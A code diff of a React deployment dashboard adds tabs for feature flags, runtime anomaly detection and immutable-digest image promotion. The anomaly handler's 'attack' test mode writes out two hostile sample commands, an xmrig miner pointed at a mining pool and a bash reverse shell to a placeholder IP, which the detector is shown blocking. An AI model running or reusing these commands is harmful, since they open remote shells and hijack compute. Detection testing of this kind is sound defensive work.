@@ -72,6 +72,10 @@ import {
   type MultiArchVerifyResult,
   type MultiArchPlanResult,
   type ChaosGameDayResult,
+  type FeatureFlagRecord,
+  type FeatureFlagEvalResult,
+  type RuntimeAnomalyInspectResult,
+  type DigestPromotionActionResult,
 } from '../lib/api';
 import { isDemoMode } from '../lib/demoMode';
 import { liveEvents } from '../lib/liveEvents';
@@ -259,8 +263,8 @@ export const ProjectDetail: React.FC<ProjectDetailProps> = ({
   const [autoBusy, setAutoBusy] = useState<'load' | 'save' | 'eval' | null>(null);
   const [autoError, setAutoError] = useState<string | null>(null);
 
-  // Cycle-13..14 OOM Forensics, Image Bloat, Egress Firewall, Multi-Arch & Chaos GameDay state
-  const [forensicsTab, setForensicsTab] = useState<'oom' | 'image' | 'egress' | 'multiarch' | 'chaos'>('oom');
+  // Cycle-13..15 OOM Forensics, Image Bloat, Egress Firewall, Multi-Arch, Chaos GameDay, Feature Flags, Runtime Anomaly & Digest Promotion state
+  const [forensicsTab, setForensicsTab] = useState<'oom' | 'image' | 'egress' | 'multiarch' | 'chaos' | 'flags' | 'anomaly' | 'promotion'>('oom');
   const [oomResult, setOomResult] = useState<OomForensicsResult | null>(null);
   const [oomBusy, setOomBusy] = useState(false);
   const [oomError, setOomError] = useState<string | null>(null);
@@ -280,6 +284,18 @@ export const ProjectDetail: React.FC<ProjectDetailProps> = ({
   const [chaosResult, setChaosResult] = useState<ChaosGameDayResult | null>(null);
   const [chaosBusy, setChaosBusy] = useState<'prod' | 'abort' | 'healthy' | null>(null);
   const [chaosError, setChaosError] = useState<string | null>(null);
+
+  // Cycle-15 Feature Flags, Runtime Anomaly & Immutable Digest Promotion state
+  const [flagsList, setFlagsList] = useState<FeatureFlagRecord[]>([]);
+  const [flagEval, setFlagEval] = useState<FeatureFlagEvalResult | null>(null);
+  const [flagBusy, setFlagBusy] = useState<string | null>(null);
+  const [flagError, setFlagError] = useState<string | null>(null);
+  const [anomalyResult, setAnomalyResult] = useState<RuntimeAnomalyInspectResult | null>(null);
+  const [anomalyBusy, setAnomalyBusy] = useState<'attack' | 'clean' | null>(null);
+  const [anomalyError, setAnomalyError] = useState<string | null>(null);
+  const [promoResult, setPromoResult] = useState<DigestPromotionActionResult | null>(null);
+  const [promoBusy, setPromoBusy] = useState<'latest' | 'self' | 'sha' | null>(null);
+  const [promoError, setPromoError] = useState<string | null>(null);
 
   useEffect(() => {
     return () => {
@@ -1309,6 +1325,133 @@ export const ProjectDetail: React.FC<ProjectDetailProps> = ({
       onNotify(msg, 'error');
     } finally {
       setChaosBusy(null);
+    }
+  };
+
+  const handleLoadFlags = async () => {
+    setFlagBusy('load');
+    setFlagError(null);
+    try {
+      const res = await api.listFeatureFlags();
+      setFlagsList(Array.isArray(res?.flags) ? res.flags : []);
+    } catch (err: unknown) {
+      setFlagError(err instanceof Error ? err.message : 'Could not load feature flags');
+    } finally {
+      setFlagBusy(null);
+    }
+  };
+
+  const handleEvaluateFlag = async (key: string) => {
+    setFlagBusy(`eval-${key}`);
+    setFlagError(null);
+    try {
+      const res = await api.evaluateFeatureFlag(key, { subjectId: 'user_42', tenantId: 'acme-pro', environment: 'prod' });
+      setFlagEval(res);
+      onNotify(`Flag "${key}" → ${res.enabled ? 'ENABLED' : 'OFF'} (${res.reason}${res.bucket != null ? ` · bucket ${res.bucket}%` : ''})`, res.enabled ? 'success' : 'info');
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : 'Flag evaluation failed';
+      setFlagError(msg);
+      onNotify(msg, 'error');
+    } finally {
+      setFlagBusy(null);
+    }
+  };
+
+  const handleKillFlag = async (key: string) => {
+    setFlagBusy(`kill-${key}`);
+    setFlagError(null);
+    try {
+      await api.killFeatureFlag(key, 'emergency_kill');
+      setFlagsList((prev) => prev.map((f) => (f.key === key ? { ...f, killed: true, enabled: false } : f)));
+      const ev = await api.evaluateFeatureFlag(key, { subjectId: 'user_42', tenantId: 'acme-pro', environment: 'prod' }).catch(() => null);
+      if (ev) setFlagEval(ev);
+      onNotify(`Emergency Kill-Switch activated on "${key}" (KILL_SWITCH_ACTIVE · 0 redeploys)`, 'error');
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : 'Kill-switch failed';
+      setFlagError(msg);
+      onNotify(msg, 'error');
+    } finally {
+      setFlagBusy(null);
+    }
+  };
+
+  const handleInspectAnomalies = async (mode: 'attack' | 'clean') => {
+    setAnomalyBusy(mode);
+    setAnomalyError(null);
+    try {
+      const events = mode === 'attack'
+        ? [
+            { type: 'process', cmd: 'xmrig -o stratum+tcp://pool.minexmr.com:3333 -u wallet' },
+            { type: 'process', cmd: 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1' },
+          ]
+        : [
+            { type: 'process', cmd: 'node /app/server.js --port 3000' },
+            { type: 'http', path: '/health', status: 200 },
+          ];
+      const res = await api.inspectProjectAnomalies(project.id, { containerName: project.name, events, persist: true });
+      setAnomalyResult(res);
+      onNotify(
+        res.clean
+          ? 'Runtime Anomaly Guard: CLEAN · 0 ALERTS (riskScore 0/100)'
+          : `Runtime Anomaly Guard BLOCKED (${Array.isArray(res.alerts) ? res.alerts.length : 2} critical threat(s) · riskScore ${res.riskScore}/100)`,
+        res.clean ? 'success' : 'error'
+      );
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : 'Runtime anomaly inspection failed';
+      setAnomalyError(msg);
+      onNotify(msg, 'error');
+    } finally {
+      setAnomalyBusy(null);
+    }
+  };
+
+  const handleRunDigestPromotion = async (mode: 'latest' | 'self' | 'sha') => {
+    setPromoBusy(mode);
+    setPromoError(null);
+    const sha64 = 'a3f5c8e1b9d20476a3f5c8e1b9d20476a3f5c8e1b9d20476a3f5c8e1b9d20476';
+    const prevSha64 = '91b0d4c2e8a7531091b0d4c2e8a7531091b0d4c2e8a7531091b0d4c2e8a75310';
+    try {
+      if (mode === 'latest') {
+        const res = await api.createProjectPromotion(project.id, {
+          imageRef: `ghcr.io/acme/${project.name}:latest`,
+          fromEnv: 'staging',
+          toEnv: 'prod',
+          sourceEnvKeys: ['DATABASE_URL'],
+          targetEnvKeys: ['DATABASE_URL'],
+          requester: 'alice@acme.dev',
+          requireDualControl: true,
+        });
+        setPromoResult(res);
+        onNotify(`Immutable Guard BLOCKED: ${res.code || 'MUTABLE_TAG_FORBIDDEN'}`, 'error');
+        return;
+      }
+      const created = await api.createProjectPromotion(project.id, {
+        imageRef: `ghcr.io/acme/${project.name}@sha256:${sha64}`,
+        fromEnv: 'staging',
+        toEnv: 'prod',
+        sourceEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
+        targetEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
+        requester: 'alice@acme.dev',
+        requireDualControl: true,
+        previousDigest: `ghcr.io/acme/${project.name}@sha256:${prevSha64}`,
+      });
+      const promoId = created.promotion?.id || 'promo_demo_1';
+      if (mode === 'self') {
+        const res = await api.approveProjectPromotion(project.id, promoId, { approver: 'alice@acme.dev', comment: 'self-approve attempt' });
+        setPromoResult(res);
+        onNotify(`Dual-Control Guard BLOCKED: ${res.code || 'DUAL_CONTROL_VIOLATION'}`, 'error');
+        return;
+      }
+      await api.approveProjectPromotion(project.id, promoId, { approver: 'bob@acme.dev', comment: 'peer-reviewed digest match' });
+      const execRes = await api.executeProjectPromotion(project.id, promoId, { dryRun: true });
+      setPromoResult(execRes);
+      onNotify('Immutable @sha256: promotion planned (staging → prod · dryRun + rollback manifest ready)', 'success');
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : 'Digest promotion failed';
+      setPromoError(msg);
+      onNotify(msg, 'error');
+    } finally {
+      setPromoBusy(null);
     }
   };
 
@@ -2983,11 +3126,19 @@ export const ProjectDetail: React.FC<ProjectDetailProps> = ({
                   { id: 'egress' as const, label: t('pd.forensicsTabEgress') },
                   { id: 'multiarch' as const, label: t('pd.forensicsTabMultiArch') },
                   { id: 'chaos' as const, label: t('pd.forensicsTabChaos') },
+                  { id: 'flags' as const, label: t('pd.forensicsTabFlags') },
+                  { id: 'anomaly' as const, label: t('pd.forensicsTabAnomaly') },
+                  { id: 'promotion' as const, label: t('pd.forensicsTabPromo') },
                 ]).map((tabItem) => (
                   <button
                     key={tabItem.id}
                     type="button"
-                    onClick={() => setForensicsTab(tabItem.id)}
+                    onClick={() => {
+                      setForensicsTab(tabItem.id);
+                      if (tabItem.id === 'flags' && flagsList.length === 0 && flagBusy === null) {
+                        void handleLoadFlags();
+                      }
+                    }}
                     className={`px-2.5 py-1 rounded-md cursor-pointer ${
                       forensicsTab === tabItem.id ? 'bg-white text-slate-900 shadow-2xs font-semibold' : 'text-slate-600 hover:text-slate-900'
                     }`}
@@ -3376,6 +3527,207 @@ export const ProjectDetail: React.FC<ProjectDetailProps> = ({
                         <span>· latencyScore: {chaosResult.breakdown.latencyScore ?? 92}</span>
                         <span>· recoveryScore: {chaosResult.breakdown.recoveryScore ?? 95}</span>
                       </div>
+                    )}
+                  </div>
+                );
+              })()}
+            </div>
+          )}
+
+          {forensicsTab === 'flags' && (
+            <div className="space-y-3">
+              {flagError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{flagError}</div>}
+              {flagsList.length === 0 ? (
+                <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-between gap-2">
+                  <span className="text-slate-600">Load declarative OpenFeature-lite flags for deterministic SHA-256 bucketing & zero-redeploy kill-switches.</span>
+                  <button
+                    type="button"
+                    disabled={flagBusy !== null}
+                    onClick={() => void handleLoadFlags()}
+                    className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer shrink-0 disabled:opacity-50"
+                  >
+                    Load Flags
+                  </button>
+                </div>
+              ) : (
+                <div className="divide-y divide-slate-100 border border-slate-200 rounded-xl overflow-hidden tabular-nums">
+                  {flagsList.slice(0, 5).map((fl) => (
+                    <div key={fl.key} className="px-3.5 py-2.5 bg-white flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                      <div className="min-w-0">
+                        <div className="flex items-center gap-2 flex-wrap font-mono">
+                          <span className="font-semibold text-slate-900">{fl.key}</span>
+                          <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold border ${
+                            fl.killed
+                              ? 'bg-red-50 text-red-700 border-red-200'
+                              : fl.enabled
+                                ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
+                                : 'bg-slate-100 text-slate-700 border-slate-200'
+                          }`}>
+                            {fl.killed ? 'KILL_SWITCH_ACTIVE' : `${fl.rolloutPct}% rollout`}
+                          </span>
+                        </div>
+                        {fl.description && <p className="text-[11px] text-slate-500 mt-0.5">{fl.description}</p>}
+                      </div>
+                      <div className="flex items-center gap-1.5 shrink-0">
+                        <button
+                          type="button"
+                          disabled={flagBusy !== null}
+                          onClick={() => void handleEvaluateFlag(fl.key)}
+                          className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
+                        >
+                          <Play className="w-3 h-3" />
+                          <span>{t('pd.flagsEvalBtn')}</span>
+                        </button>
+                        <button
+                          type="button"
+                          disabled={flagBusy !== null || Boolean(fl.killed)}
+                          onClick={() => void handleKillFlag(fl.key)}
+                          className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
+                        >
+                          <Power className="w-3 h-3" />
+                          <span>{t('pd.flagsKillBtn')}</span>
+                        </button>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+              {flagEval && (
+                <div className={`p-3 rounded-xl border font-mono text-[11px] flex flex-wrap items-center gap-2 tabular-nums ${
+                  flagEval.reason === 'KILL_SWITCH_ACTIVE'
+                    ? 'bg-red-50 border-red-200 text-red-700'
+                    : flagEval.enabled
+                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
+                      : 'bg-amber-50 border-amber-200 text-amber-800'
+                }`}>
+                  <span className="px-2 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
+                    {flagEval.key} → {flagEval.enabled ? 'ENABLED' : 'DISABLED'}
+                  </span>
+                  <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
+                    {flagEval.reason}
+                  </span>
+                  {flagEval.bucket != null && <span>SHA-256 bucket: {flagEval.bucket}%</span>}
+                </div>
+              )}
+            </div>
+          )}
+
+          {forensicsTab === 'anomaly' && (
+            <div className="space-y-3">
+              <div className="flex flex-wrap items-center gap-2">
+                <button
+                  type="button"
+                  disabled={anomalyBusy !== null}
+                  onClick={() => void handleInspectAnomalies('attack')}
+                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
+                >
+                  {anomalyBusy === 'attack' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
+                  <span>{t('pd.anomTestAttack')}</span>
+                </button>
+                <button
+                  type="button"
+                  disabled={anomalyBusy !== null}
+                  onClick={() => void handleInspectAnomalies('clean')}
+                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
+                >
+                  {anomalyBusy === 'clean' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
+                  <span>{t('pd.anomTestClean')}</span>
+                </button>
+              </div>
+              {anomalyError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{anomalyError}</div>}
+              {anomalyResult && (() => {
+                const alerts = Array.isArray(anomalyResult.alerts) ? anomalyResult.alerts : [];
+                return (
+                  <div className={`p-3.5 rounded-xl border space-y-2 tabular-nums font-mono text-[11px] ${
+                    anomalyResult.clean
+                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
+                      : 'bg-red-50 border-red-200 text-red-700'
+                  }`}>
+                    <div className="flex flex-wrap items-center gap-2">
+                      <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
+                        {anomalyResult.clean ? 'CLEAN · 0 ALERTS' : `ANOMALY DETECTED · riskScore ${anomalyResult.riskScore}/100`}
+                      </span>
+                      {anomalyResult.recommendedAction && (
+                        <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
+                          action: {anomalyResult.recommendedAction}
+                        </span>
+                      )}
+                    </div>
+                    {alerts.length > 0 && (
+                      <div className="space-y-1">
+                        {alerts.map((al, idx) => (
+                          <div key={idx}>
+                            • {typeof al === 'string' ? al : `[${al.ruleId || 'ANOMALY'}] ${al.message || al.evidence || 'Runtime security rule triggered'}`}
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                );
+              })()}
+            </div>
+          )}
+
+          {forensicsTab === 'promotion' && (
+            <div className="space-y-3">
+              <div className="flex flex-wrap items-center gap-2">
+                <button
+                  type="button"
+                  disabled={promoBusy !== null}
+                  onClick={() => void handleRunDigestPromotion('latest')}
+                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
+                >
+                  {promoBusy === 'latest' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
+                  <span>{t('pd.promoTestLatest')}</span>
+                </button>
+                <button
+                  type="button"
+                  disabled={promoBusy !== null}
+                  onClick={() => void handleRunDigestPromotion('self')}
+                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-amber-200 bg-amber-50 hover:bg-slate-100 text-amber-800 font-medium cursor-pointer disabled:opacity-50"
+                >
+                  {promoBusy === 'self' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
+                  <span>{t('pd.promoTestSelfApprove')}</span>
+                </button>
+                <button
+                  type="button"
+                  disabled={promoBusy !== null}
+                  onClick={() => void handleRunDigestPromotion('sha')}
+                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
+                >
+                  {promoBusy === 'sha' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Rocket className="w-3.5 h-3.5" />}
+                  <span>{t('pd.promoTestSha')}</span>
+                </button>
+              </div>
+              {promoError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{promoError}</div>}
+              {promoResult && (() => {
+                const blocked = Boolean(promoResult.blocked || promoResult.code === 'MUTABLE_TAG_FORBIDDEN' || promoResult.code === 'DUAL_CONTROL_VIOLATION' || promoResult.code === 'MISSING_TARGET_ENV_KEYS');
+                const manifest = promoResult.rollbackManifest || promoResult.promotion?.rollbackManifest;
+                return (
+                  <div className="space-y-2 tabular-nums font-mono text-[11px]">
+                    <div className={`p-3 rounded-xl border space-y-1.5 ${
+                      blocked
+                        ? 'bg-red-50 border-red-200 text-red-700'
+                        : 'bg-emerald-50 border-emerald-200 text-emerald-700'
+                    }`}>
+                      <div className="flex flex-wrap items-center gap-2">
+                        <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
+                          {blocked ? (promoResult.code || 'PROMOTION_BLOCKED') : 'IMMUTABLE @sha256: PROMOTED (DRY-RUN)'}
+                        </span>
+                        {promoResult.promotion && (
+                          <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
+                            {promoResult.promotion.fromEnv} → {promoResult.promotion.toEnv} · {promoResult.promotion.status}
+                          </span>
+                        )}
+                      </div>
+                      {(promoResult.message || promoResult.error) && (
+                        <div>{promoResult.message || promoResult.error}</div>
+                      )}
+                    </div>
+                    {manifest && (
+                      <pre className="p-3 rounded-xl bg-slate-950 text-sky-300 font-mono text-[10px] leading-relaxed overflow-x-auto max-h-40 border border-slate-800">
+                        {JSON.stringify(manifest, null, 2)}
+                      </pre>
                     )}
                   </div>
                 );
